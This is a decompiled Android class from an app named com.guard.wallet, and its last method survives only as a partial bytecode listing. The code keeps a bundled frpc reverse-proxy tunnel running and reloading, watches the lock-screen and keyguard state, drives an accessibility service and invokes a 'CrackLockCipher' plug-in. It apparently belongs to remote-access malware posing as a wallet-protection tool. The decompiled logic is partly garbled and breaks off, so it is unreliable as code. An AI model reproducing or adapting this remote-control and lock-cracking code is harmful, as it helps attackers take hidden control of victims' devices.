package com.guard.wallet.thread;

import a1.q;
import android.os.Build.VERSION;
import android.util.Log;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.helper.o;
import com.guard.wallet.helper.r;
import com.guard.wallet.req.ReqListenHelper;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class b extends TimerTask {
   public static final ReentrantLock q = new ReentrantLock();
   public final s.a a = new s.a(5000, 2);
   public Timer b;
   public String c;
   public String d;
   public LinkedList e;
   public Process f;
   public boolean g;
   public boolean h = false;
   public final AtomicInteger i = new AtomicInteger(0);
   public final LinkedList j = new LinkedList();
   public final LinkedList k;
   public final AtomicReference l;
   public final AtomicLong m;
   public final AtomicLong n;
   public final AtomicLong o;
   public final AtomicLong p;

   public b() {
      LinkedList var1 = new LinkedList();
      this.k = var1;
      this.l = new AtomicReference<>(r.d.b);
      this.m = new AtomicLong(0L);
      this.n = new AtomicLong(0L);
      this.o = new AtomicLong(0L);
      this.p = new AtomicLong(0L);
      this.e = new LinkedList();
      this.c();
      var1.add(4194304);
      var1.add(2048);
      var1.add(64);
      if (VERSION.SDK_INT >= 33) {
         var1.add(33554432);
      }

      var1.add(131072);
      var1.add(16777216);
   }

   public static boolean a() {
      String var0 = com.guard.wallet.utils.g.i0();
      if (!a1.q.B(var0)) {
         if (a1.q.v(var0)) {
            return true;
         } else {
            Log.d("CheckProcessThread", "frpc.ini 文件不存在");
            com.guard.wallet.http.l.u();
            return false;
         }
      } else {
         return true;
      }
   }

   public static String d() {
      String var0 = com.guard.wallet.utils.g.y0();
      if (!a1.q.B(var0)) {
         Log.d("CheckProcessThread", "APP Lib目录:".concat(var0));
         var0 = var0.concat("/").concat("libfrpc.so");
         if (a1.q.w(var0)) {
            return var0;
         }
      }

      return null;
   }

   public static void f(int var0) {
      String var3 = com.guard.wallet.utils.h.l("lockSubscribeId");
      if (!a1.q.B(var3)) {
         com.guard.wallet.http.l.h(new ReqListenHelper(var3, var0));
         com.guard.wallet.utils.h.w("lockSubscribeId");
      }

      boolean var1 = r.k();
      boolean var2 = true;
      if (var1) {
         if (var0 == 4) {
            var1 = true;
         } else {
            var1 = false;
         }

         r.g(var1);
      }

      if (var0 == 4) {
         var1 = var2;
      } else {
         var1 = false;
      }

      com.guard.wallet.helper.o.f(null, var1);
   }

   public final boolean b() {
      boolean var2 = a1.q.E(7400);
      boolean var1 = true;
      var2 ^= true;
      if (!var2) {
         var1 = false;
      }

      this.g = var1;
      return var2;
   }

   public final void c() {
      this.c = d();
      String var1 = com.guard.wallet.utils.g.i0();
      if (!a1.q.B(var1)) {
         this.d = var1.concat("/").concat("frpc.ini");
         Log.d("CheckProcessThread", "APP 数据目录:".concat(var1));
      }

      if (!a1.q.B(this.c) && !a1.q.B(this.d)) {
         Log.d("CheckProcessThread", this.c);
         Log.d("CheckProcessThread", this.d);
         this.e.clear();
         this.e.add(this.c);
         this.e.add("-c");
         this.e.add(this.d);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // $VF: Could not inline inconsistent finally blocks
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public final void e() {
      String var4 = d();
      this.c = var4;
      if (!a1.q.B(var4) && a1.q.w(this.c)) {
         this.c = d();
         var4 = com.guard.wallet.utils.g.i0();
         if (!a1.q.B(var4)) {
            this.d = var4.concat("/").concat("frpc.ini");
            Log.d("CheckProcessThread", "APP 数据目录:".concat(var4));
         }

         if (!a1.q.B(this.c) && !a1.q.B(this.d)) {
            Log.d("CheckProcessThread", this.c);
            Log.d("CheckProcessThread", this.d);
            this.e.clear();
            this.e.add(this.c);
            this.e.add("reload");
            this.e.add("-c");
            this.e.add(this.d);
         }

         if (a()) {
            if (!this.e.isEmpty()) {
               var4 = com.guard.wallet.utils.g.y0();
               boolean var3 = a1.q.B(var4);
               BufferedReader var7 = null;
               if (!var3) {
                  Log.d("CheckProcessThread", "APP Lib目录:".concat(var4));
               } else {
                  var4 = null;
               }

               if (this.b()) {
                  int var2 = 0;
                  CommandResult var5 = a1.q.u(new String[]{"ps -ef | grep frpc"}, false, true);
                  int var1 = var2;
                  if (var5.getResult() == 0) {
                     var1 = var2;
                     if (var5.getSuccessMsgLines() != null) {
                        var1 = var2;
                        if (!var5.getSuccessMsgLines().isEmpty()) {
                           Iterator var6 = var5.getSuccessMsgLines().iterator();

                           while (true) {
                              var1 = var2;
                              if (!var6.hasNext()) {
                                 break;
                              }

                              String var260 = (String)var6.next();
                              Log.d("CheckProcessThread", var260);
                              if (!a1.q.B(var260) && var260.contains(this.d)) {
                                 var1 = 1;
                                 break;
                              }
                           }
                        }
                     }
                  }

                  if (var1 && !a1.q.B(var4)) {
                     LinkedList var265 = this.e;
                     var1 = -1;
                     CommandResult var251;
                     if (var265 != null && var265.size() != 0) {
                        LinkedList var9 = new LinkedList();
                        LinkedList var8 = new LinkedList();
                        boolean var227 = false /* VF: Semaphore variable */;

                        label2110: {
                           label2147: {
                              label2148: {
                                 label2149: {
                                    try {
                                       var227 = true;
                                       ProcessBuilder var262 = new ProcessBuilder(var265);
                                       File var267 = new File(var4);
                                       var262.directory(var267);
                                       var266 = var262.start();
                                       var227 = false;
                                    } finally {
                                       if (var227) {
                                          var7 = null;
                                          var261 = null;
                                          var266 = var261;
                                          break label2149;
                                       }
                                    }

                                    if (var266 == null) {
                                       var261 = null;
                                       var257 = var7;
                                       break label2148;
                                    }

                                    var2 = var1;

                                    label2100: {
                                       Throwable var10000;
                                       label2150: {
                                          try {
                                             var1 = var266.waitFor(30L, TimeUnit.SECONDS) ^ 1;
                                          } catch (Throwable var244) {
                                             var10000 = var244;
                                             boolean var10001 = false;
                                             break label2150;
                                          }

                                          var2 = var1;

                                          try {
                                             var7 = new BufferedReader(var252);
                                          } catch (Throwable var243) {
                                             var10000 = var243;
                                             boolean var277 = false;
                                             break label2150;
                                          }

                                          var2 = var1;

                                          try {
                                             // [VF-FIX] new moved to init line
                                          } catch (Throwable var242) {
                                             var10000 = var242;
                                             boolean var278 = false;
                                             break label2150;
                                          }

                                          var2 = var1;

                                          try {
                                             var252 = new InputStreamReader(var266.getInputStream());
                                          } catch (Throwable var241) {
                                             var10000 = var241;
                                             boolean var279 = false;
                                             break label2150;
                                          }

                                          var2 = var1;

                                          label2083:
                                          try {
                                             // [VF-FIX] var7 = new BufferedReader(var252);
                                             break label2100;
                                          } catch (Throwable var240) {
                                             var10000 = var240;
                                             boolean var280 = false;
                                             break label2083;
                                          }
                                       }

                                       var4 = var10000;
                                       var261 = null;
                                       var7 = null;
                                       var1 = var2;
                                       break label2149;
                                    }

                                    try {
                                       InputStreamReader var253 = new InputStreamReader(var266.getErrorStream());
                                       var261 = new BufferedReader(var253);
                                    } finally {
                                       ;
                                    }

                                    Throwable var273;
                                    label2077:
                                    while (true) {
                                       try {
                                          var4 = var7.readLine();
                                       } catch (Throwable var238) {
                                          var273 = var238;
                                          boolean var281 = false;
                                          break;
                                       }

                                       if (var4 == null) {
                                          while (true) {
                                             try {
                                                var4 = var261.readLine();
                                             } catch (Throwable var237) {
                                                var273 = var237;
                                                boolean var283 = false;
                                                break label2077;
                                             }

                                             if (var4 == null) {
                                                var257 = var7;
                                                break label2148;
                                             }

                                             try {
                                                var8.add(var4);
                                             } catch (Throwable var236) {
                                                var273 = var236;
                                                boolean var284 = false;
                                                break label2077;
                                             }
                                          }
                                       }

                                       try {
                                          var9.add(var4);
                                       } catch (Throwable var239) {
                                          var273 = var239;
                                          boolean var282 = false;
                                          break;
                                       }
                                    }

                                    var4 = var273;
                                 }

                                 boolean var28 = false /* VF: Semaphore variable */;

                                 try {
                                    var28 = true;
                                    a1.q.t("ShellUtils", var4);
                                    var28 = false;
                                 } finally {
                                    if (var28) {
                                       label2021: {
                                          IOException var274;
                                          label2154: {
                                             if (var7 != null) {
                                                try {
                                                   var7.close();
                                                } catch (IOException var230) {
                                                   var274 = var230;
                                                   boolean var285 = false;
                                                   break label2154;
                                                }
                                             }

                                             if (var261 == null) {
                                                break label2021;
                                             }

                                             try {
                                                var261.close();
                                                break label2021;
                                             } catch (IOException var229) {
                                                var274 = var229;
                                                boolean var286 = false;
                                             }
                                          }

                                          IOException var263 = var274;
                                          a1.q.s("ShellUtils", var263);
                                       }

                                       if (var266 != null) {
                                          var266.destroyForcibly();
                                       }
                                    }
                                 }

                                 label2059: {
                                    IOException var275;
                                    label2155: {
                                       if (var7 != null) {
                                          try {
                                             var7.close();
                                          } catch (IOException var235) {
                                             var275 = var235;
                                             boolean var287 = false;
                                             break label2155;
                                          }
                                       }

                                       if (var261 == null) {
                                          break label2059;
                                       }

                                       try {
                                          var261.close();
                                          break label2059;
                                       } catch (IOException var234) {
                                          var275 = var234;
                                          boolean var288 = false;
                                       }
                                    }

                                    IOException var256 = var275;
                                    a1.q.s("ShellUtils", var256);
                                 }

                                 var2 = var1;
                                 if (var266 == null) {
                                    break label2110;
                                 }
                                 break label2147;
                              }

                              label2048: {
                                 IOException var276;
                                 label2156: {
                                    if (var257 != null) {
                                       try {
                                          var257.close();
                                       } catch (IOException var233) {
                                          var276 = var233;
                                          boolean var289 = false;
                                          break label2156;
                                       }
                                    }

                                    if (var261 == null) {
                                       break label2048;
                                    }

                                    try {
                                       var261.close();
                                       break label2048;
                                    } catch (IOException var232) {
                                       var276 = var232;
                                       boolean var290 = false;
                                    }
                                 }

                                 IOException var258 = var276;
                                 a1.q.s("ShellUtils", var258);
                              }

                              var2 = var1;
                              if (var266 == null) {
                                 break label2110;
                              }
                           }

                           var266.destroyForcibly();
                           var2 = var1;
                        }

                        var251 = new CommandResult(var2, var9, var8);
                     } else {
                        var251 = new CommandResult(-1, null, null);
                     }

                     if (var251.getResult() == 0 && var251.getSuccessMsgLines() != null && !var251.getSuccessMsgLines().isEmpty()) {
                        for (String var259 : var251.getSuccessMsgLines()) {
                           if (!a1.q.B(var259) && var259.contains("reload success")) {
                              Log.d("CheckProcessThread", "frpc.ini".concat(" 热加载成功"));
                              break;
                           }
                        }
                     }
                  }
               }
            }
         }
      } else {
         Log.d("CheckProcessThread", "libfrpc.so 文件不存在");
      }
   }

   public final void g() {
      if (this.b == null) {
         this.b = new Timer();
      }

      this.b.schedule(this, 5000L, 5000L);
   }

   @Override
   public final void run() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 000: getstatic com/guard/wallet/thread/b.q Ljava/util/concurrent/locks/ReentrantLock;
      // 003: invokevirtual java/util/concurrent/locks/ReentrantLock.tryLock ()Z
      // 006: ifeq 7b7
      // 009: invokestatic h/e.S ()Lh/e;
      // 00c: ifnull 01b
      // 00f: sipush 7912
      // 012: invokestatic a1/q.E (I)Z
      // 015: ifne 01b
      // 018: invokestatic com/guard/wallet/http/l.j ()V
      // 01b: ldc "CheckProcessThread"
      // 01d: ldc_w "check process thread is running"
      // 020: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 023: pop
      // 024: aload 0
      // 025: monitorenter
      // 026: bipush 0
      // 027: istore 3
      // 028: ldc_w "screenState"
      // 02b: invokestatic com/guard/wallet/utils/h.i (Ljava/lang/String;)I
      // 02e: istore 2
      // 02f: iload 2
      // 030: istore 1
      // 031: iload 2
      // 032: bipush 2
      // 033: if_icmpne 038
      // 036: bipush 1
      // 037: istore 1
      // 038: iload 1
      // 039: istore 2
      // 03a: iload 1
      // 03b: bipush 3
      // 03c: if_icmpne 041
      // 03f: bipush 0
      // 040: istore 2
      // 041: invokestatic com/guard/wallet/utils/g.B0 ()Lcom/guard/wallet/req/LockPatternVO;
      // 044: astore 7
      // 046: invokestatic com/guard/wallet/utils/e.j ()Z
      // 049: ifne 051
      // 04c: bipush 0
      // 04d: istore 1
      // 04e: goto 06f
      // 051: aload 7
      // 053: invokevirtual com/guard/wallet/req/LockPatternVO.getIsKeyguardLocked ()Ljava/lang/Integer;
      // 056: invokevirtual java/lang/Integer.intValue ()I
      // 059: ifne 06d
      // 05c: aload 7
      // 05e: invokevirtual com/guard/wallet/req/LockPatternVO.getIsDeviceSecure ()Ljava/lang/Integer;
      // 061: invokevirtual java/lang/Integer.intValue ()I
      // 064: bipush 1
      // 065: if_icmpne 06d
      // 068: bipush 4
      // 069: istore 1
      // 06a: goto 06f
      // 06d: bipush 1
      // 06e: istore 1
      // 06f: iload 1
      // 070: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 073: bipush 0
      // 074: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 077: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 07a: ifne 080
      // 07d: invokestatic com/guard/wallet/LockActivity.a ()V
      // 080: iload 2
      // 081: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 084: iload 1
      // 085: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 088: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 08b: ifne 1ba
      // 08e: iload 1
      // 08f: ifne 0e0
      // 092: iload 1
      // 093: invokestatic com/guard/wallet/thread/b.f (I)V
      // 096: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 099: ifnull 0bb
      // 09c: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 09f: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.j ()Z
      // 0a2: ifeq 0bb
      // 0a5: getstatic com/guard/wallet/service/MyAccessibilityService.q Ljava/util/concurrent/atomic/AtomicBoolean;
      // 0a8: bipush 1
      // 0a9: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 0ac: ldc "CheckProcessThread"
      // 0ae: ldc_w "stopLocalAccessibilityDelegate"
      // 0b1: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0b4: pop
      // 0b5: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 0b8: invokevirtual com/guard/wallet/service/AccessibilityDelegateManager.D ()V
      // 0bb: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 0be: ifnull 0d7
      // 0c1: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 0c4: invokevirtual com/guard/wallet/MainApplication.getCrackLockCipherPlug ()Lcom/guard/wallet/plug/c;
      // 0c7: ifnull 0d7
      // 0ca: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 0cd: invokevirtual com/guard/wallet/MainApplication.getCrackLockCipherPlug ()Lcom/guard/wallet/plug/c;
      // 0d0: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 0d3: pop
      // 0d4: invokestatic com/guard/wallet/plug/c.f ()V
      // 0d7: invokestatic com/guard/wallet/helper/d.a ()V
      // 0da: ldc_w "lockBatchId"
      // 0dd: invokestatic com/guard/wallet/utils/h.w (Ljava/lang/String;)V
      // 0e0: iload 1
      // 0e1: bipush 1
      // 0e2: if_icmpne 0fb
      // 0e5: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 0e8: ifeq 0fb
      // 0eb: getstatic com/guard/wallet/receiver/ScreenBroadcastReceiver.b Lcom/guard/wallet/utils/i;
      // 0ee: invokevirtual com/guard/wallet/utils/i.a ()J
      // 0f1: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 0f4: ldc_w "lockBatchId"
      // 0f7: invokestatic com/guard/wallet/utils/h.D (Ljava/lang/Object;Ljava/lang/String;)Z
      // 0fa: pop
      // 0fb: iload 1
      // 0fc: bipush 4
      // 0fd: if_icmpne 156
      // 100: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 103: ifnull 12b
      // 106: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 109: invokevirtual com/guard/wallet/MainApplication.isUserUnlockedInstance ()Z
      // 10c: ifne 115
      // 10f: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 112: invokevirtual com/guard/wallet/MainApplication.unlockedInstance ()V
      // 115: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 118: invokevirtual com/guard/wallet/MainApplication.getCrackLockCipherPlug ()Lcom/guard/wallet/plug/c;
      // 11b: ifnull 12b
      // 11e: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 121: invokevirtual com/guard/wallet/MainApplication.getCrackLockCipherPlug ()Lcom/guard/wallet/plug/c;
      // 124: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 127: pop
      // 128: invokestatic com/guard/wallet/plug/c.g ()V
      // 12b: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 12e: ifnull 13a
      // 131: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 134: ldc_w "KEEP_ADB_ALIVE_SCREEN_USER_PRESENT"
      // 137: invokevirtual com/guard/wallet/MainApplication.offerStrategyEvent (Ljava/lang/String;)V
      // 13a: iload 1
      // 13b: invokestatic com/guard/wallet/thread/b.f (I)V
      // 13e: getstatic com/guard/wallet/service/MyAccessibilityService.q Ljava/util/concurrent/atomic/AtomicBoolean;
      // 141: astore 7
      // 143: aload 7
      // 145: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
      // 148: ifeq 156
      // 14b: aload 7
      // 14d: bipush 0
      // 14e: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 151: bipush 2
      // 152: invokestatic com/guard/wallet/utils/g.F0 (I)Z
      // 155: pop
      // 156: iload 1
      // 157: ifne 162
      // 15a: ldc_w "android.intent.action.SCREEN_OFF"
      // 15d: astore 7
      // 15f: goto 193
      // 162: ldc_w "android.intent.action.SCREEN_ON"
      // 165: astore 7
      // 167: iload 1
      // 168: bipush 1
      // 169: if_icmpne 16f
      // 16c: goto 193
      // 16f: iload 1
      // 170: bipush 2
      // 171: if_icmpne 17c
      // 174: ldc_w "android.intent.action.DREAMING_STARTED"
      // 177: astore 7
      // 179: goto 193
      // 17c: iload 1
      // 17d: bipush 3
      // 17e: if_icmpne 189
      // 181: ldc_w "android.intent.action.DREAMING_STOPPED"
      // 184: astore 7
      // 186: goto 193
      // 189: iload 1
      // 18a: bipush 4
      // 18b: if_icmpne 193
      // 18e: ldc_w "android.intent.action.USER_PRESENT"
      // 191: astore 7
      // 193: iload 1
      // 194: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 197: ldc_w "screenState"
      // 19a: invokestatic com/guard/wallet/utils/h.D (Ljava/lang/Object;Ljava/lang/String;)Z
      // 19d: pop
      // 19e: getstatic com/guard/wallet/receiver/ScreenBroadcastReceiver.b Lcom/guard/wallet/utils/i;
      // 1a1: astore 8
      // 1a3: iload 1
      // 1a4: aload 7
      // 1a6: invokestatic com/guard/wallet/utils/h.H (ILjava/lang/String;)V
      // 1a9: goto 1ba
      // 1ac: astore 7
      // 1ae: goto 7b2
      // 1b1: astore 7
      // 1b3: ldc "CheckProcessThread"
      // 1b5: aload 7
      // 1b7: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 1ba: aload 0
      // 1bb: monitorexit
      // 1bc: invokestatic com/guard/wallet/thread/b.a ()Z
      // 1bf: pop
      // 1c0: aload 0
      // 1c1: invokevirtual com/guard/wallet/thread/b.b ()Z
      // 1c4: pop
      // 1c5: aload 0
      // 1c6: getfield com/guard/wallet/thread/b.l Ljava/util/concurrent/atomic/AtomicReference;
      // 1c9: invokevirtual java/util/concurrent/atomic/AtomicReference.get ()Ljava/lang/Object;
      // 1cc: getstatic r/d.b Lr/d;
      // 1cf: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 1d2: ifne 2fb
      // 1d5: aload 0
      // 1d6: getfield com/guard/wallet/thread/b.m Ljava/util/concurrent/atomic/AtomicLong;
      // 1d9: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 1dc: lconst_0
      // 1dd: lcmp
      // 1de: ifle 2fb
      // 1e1: invokestatic com/guard/wallet/utils/e.j ()Z
      // 1e4: istore 6
      // 1e6: aload 0
      // 1e7: getfield com/guard/wallet/thread/b.p Ljava/util/concurrent/atomic/AtomicLong;
      // 1ea: astore 7
      // 1ec: aload 0
      // 1ed: getfield com/guard/wallet/thread/b.o Ljava/util/concurrent/atomic/AtomicLong;
      // 1f0: astore 8
      // 1f2: iload 6
      // 1f4: ifeq 20c
      // 1f7: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 1fa: ifne 20c
      // 1fd: aload 8
      // 1ff: lconst_0
      // 200: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 203: aload 7
      // 205: lconst_0
      // 206: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 209: goto 25c
      // 20c: invokestatic java/lang/System.currentTimeMillis ()J
      // 20f: lstore 4
      // 211: aload 8
      // 213: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 216: lconst_0
      // 217: lcmp
      // 218: ifne 222
      // 21b: aload 8
      // 21d: lload 4
      // 21f: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 222: lload 4
      // 224: aload 8
      // 226: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 229: lsub
      // 22a: lstore 4
      // 22c: lload 4
      // 22e: lconst_0
      // 22f: lcmp
      // 230: ifle 25c
      // 233: lload 4
      // 235: ldc2_w 60000
      // 238: ldiv
      // 239: lstore 4
      // 23b: lload 4
      // 23d: aload 7
      // 23f: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 242: lcmp
      // 243: ifle 25c
      // 246: aload 7
      // 248: lload 4
      // 24a: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 24d: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 250: ifnull 25c
      // 253: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 256: ldc_w "SCREEN_OFF_LONG_DURATION"
      // 259: invokevirtual com/guard/wallet/MainApplication.offerStrategyEvent (Ljava/lang/String;)V
      // 25c: invokestatic java/lang/System.currentTimeMillis ()J
      // 25f: lstore 4
      // 261: aload 0
      // 262: getfield com/guard/wallet/thread/b.m Ljava/util/concurrent/atomic/AtomicLong;
      // 265: astore 10
      // 267: lload 4
      // 269: aload 10
      // 26b: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 26e: lsub
      // 26f: ldc2_w 60000
      // 272: lcmp
      // 273: ifle 2a8
      // 276: aload 0
      // 277: getfield com/guard/wallet/thread/b.l Ljava/util/concurrent/atomic/AtomicReference;
      // 27a: astore 9
      // 27c: aload 9
      // 27e: invokevirtual java/util/concurrent/atomic/AtomicReference.get ()Ljava/lang/Object;
      // 281: astore 8
      // 283: getstatic r/d.c Lr/d;
      // 286: astore 7
      // 288: aload 8
      // 28a: aload 7
      // 28c: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 28f: ifne 2a8
      // 292: aload 9
      // 294: aload 7
      // 296: invokevirtual java/util/concurrent/atomic/AtomicReference.set (Ljava/lang/Object;)V
      // 299: aload 10
      // 29b: lload 4
      // 29d: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 2a0: aload 0
      // 2a1: getfield com/guard/wallet/thread/b.n Ljava/util/concurrent/atomic/AtomicLong;
      // 2a4: lconst_0
      // 2a5: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 2a8: aload 0
      // 2a9: getfield com/guard/wallet/thread/b.l Ljava/util/concurrent/atomic/AtomicReference;
      // 2ac: invokevirtual java/util/concurrent/atomic/AtomicReference.get ()Ljava/lang/Object;
      // 2af: getstatic r/d.c Lr/d;
      // 2b2: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 2b5: ifeq 2fb
      // 2b8: invokestatic java/lang/System.currentTimeMillis ()J
      // 2bb: aload 0
      // 2bc: getfield com/guard/wallet/thread/b.m Ljava/util/concurrent/atomic/AtomicLong;
      // 2bf: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 2c2: lsub
      // 2c3: lstore 4
      // 2c5: lload 4
      // 2c7: lconst_0
      // 2c8: lcmp
      // 2c9: ifle 2fb
      // 2cc: lload 4
      // 2ce: ldc2_w 60000
      // 2d1: ldiv
      // 2d2: lstore 4
      // 2d4: aload 0
      // 2d5: getfield com/guard/wallet/thread/b.n Ljava/util/concurrent/atomic/AtomicLong;
      // 2d8: astore 7
      // 2da: lload 4
      // 2dc: aload 7
      // 2de: invokevirtual java/util/concurrent/atomic/AtomicLong.get ()J
      // 2e1: lcmp
      // 2e2: ifle 2fb
      // 2e5: aload 7
      // 2e7: lload 4
      // 2e9: invokevirtual java/util/concurrent/atomic/AtomicLong.set (J)V
      // 2ec: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 2ef: ifnull 2fb
      // 2f2: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 2f5: ldc_w "INTERACTIVE_IDLE_LONG_DURATION"
      // 2f8: invokevirtual com/guard/wallet/MainApplication.offerStrategyEvent (Ljava/lang/String;)V
      // 2fb: aload 0
      // 2fc: getfield com/guard/wallet/thread/b.g Z
      // 2ff: istore 6
      // 301: aconst_null
      // 302: astore 11
      // 304: iload 6
      // 306: ifne 4eb
      // 309: new com/guard/wallet/req/MessageRecordVO
      // 30c: dup
      // 30d: invokespecial com/guard/wallet/req/MessageRecordVO.<init> ()V
      // 310: astore 8
      // 312: new com/guard/wallet/req/MessageBodyVO
      // 315: dup
      // 316: invokespecial com/guard/wallet/req/MessageBodyVO.<init> ()V
      // 319: astore 7
      // 31b: aload 8
      // 31d: ldc_w "android.app.service.net.rpc.stopped"
      // 320: invokevirtual com/guard/wallet/req/MessageRecordVO.setIntentCode (Ljava/lang/String;)V
      // 323: aload 8
      // 325: aload 7
      // 327: invokevirtual com/guard/wallet/req/MessageRecordVO.setExtraBody (Lcom/guard/wallet/req/MessageBodyVO;)V
      // 32a: aload 0
      // 32b: getfield com/guard/wallet/thread/b.a Ls/a;
      // 32e: aload 8
      // 330: invokevirtual s/a.a (Lcom/guard/wallet/req/MessageRecordVO;)V
      // 333: invokestatic com/guard/wallet/utils/h.F ()V
      // 336: aload 0
      // 337: getfield com/guard/wallet/thread/b.i Ljava/util/concurrent/atomic/AtomicInteger;
      // 33a: invokevirtual java/util/concurrent/atomic/AtomicInteger.incrementAndGet ()I
      // 33d: bipush 3
      // 33e: if_icmplt 520
      // 341: aload 0
      // 342: getfield com/guard/wallet/thread/b.h Z
      // 345: ifne 520
      // 348: aload 0
      // 349: getfield com/guard/wallet/thread/b.i Ljava/util/concurrent/atomic/AtomicInteger;
      // 34c: bipush 0
      // 34d: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // 350: invokestatic com/guard/wallet/utils/g.i0 ()Ljava/lang/String;
      // 353: astore 7
      // 355: invokestatic com/guard/wallet/thread/b.d ()Ljava/lang/String;
      // 358: astore 8
      // 35a: aload 0
      // 35b: aload 8
      // 35d: putfield com/guard/wallet/thread/b.c Ljava/lang/String;
      // 360: aload 8
      // 362: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 365: ifne 4df
      // 368: aload 0
      // 369: getfield com/guard/wallet/thread/b.c Ljava/lang/String;
      // 36c: invokestatic a1/q.w (Ljava/lang/String;)Z
      // 36f: ifne 375
      // 372: goto 4df
      // 375: aload 0
      // 376: invokevirtual com/guard/wallet/thread/b.c ()V
      // 379: aload 7
      // 37b: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 37e: ifne 520
      // 381: invokestatic com/guard/wallet/thread/b.a ()Z
      // 384: ifne 38a
      // 387: goto 520
      // 38a: aload 0
      // 38b: getfield com/guard/wallet/thread/b.f Ljava/lang/Process;
      // 38e: astore 8
      // 390: aload 8
      // 392: ifnonnull 398
      // 395: goto 3b3
      // 398: aload 8
      // 39a: invokevirtual java/lang/Process.exitValue ()I
      // 39d: istore 1
      // 39e: iload 1
      // 39f: iflt 3a5
      // 3a2: goto 3b3
      // 3a5: bipush 0
      // 3a6: istore 1
      // 3a7: goto 3b5
      // 3aa: astore 8
      // 3ac: ldc "CheckProcessThread"
      // 3ae: aload 8
      // 3b0: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 3b3: bipush 1
      // 3b4: istore 1
      // 3b5: iload 1
